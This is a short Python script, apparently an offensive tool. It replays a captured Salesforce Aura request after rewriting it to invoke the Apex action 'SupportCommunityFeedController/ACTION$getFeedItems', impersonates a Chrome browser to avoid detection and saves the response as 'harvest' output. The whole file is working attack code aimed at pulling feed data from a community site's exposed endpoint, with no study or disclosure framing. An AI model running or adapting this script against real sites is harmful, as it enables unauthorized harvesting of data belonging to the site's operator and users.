import json
from curl_cffi import requests
import urllib.parse

print("[*] Loading base captured request structure...")
with open("captured_aura_request.json", "r") as f:
    base_req = json.load(f)

# Clean the URL by removing specific quarterback action query params
raw_url = base_req["url"]
base_url = raw_url.split("?")[0]
headers = base_req["headers"]
original_post_data = base_req["post_data"]

parsed_data = dict(urllib.parse.parse_qsl(original_post_data))

# Define our target high-value action
target_descriptor = "apex://SupportCommunityFeedController/ACTION$getFeedItems"

message_obj = {
    "actions": [
        {
            "id": "400;a",
            "descriptor": target_descriptor,
            "callingDescriptor": "UNKNOWN",
            "params": {}
        }
    ]
}

parsed_data["message"] = json.dumps(message_obj)
new_post_data = urllib.parse.urlencode(parsed_data)

session = requests.Session()
print(f"[*] Dispatching clean-gateway Aura request to {target_descriptor}...")

res = session.post(base_url, headers=headers, data=new_post_data, impersonate="chrome120", timeout=15)
print(f"[+] Status Code: {res.status_code} | Length: {len(res.text)}")
print(f"[+] Response Preview:\n{res.text[:2000]}")

with open("harvest_v2_output.json", "w") as out:
    out.write(res.text)

print("[+] Saved response to harvest_v2_output.json")

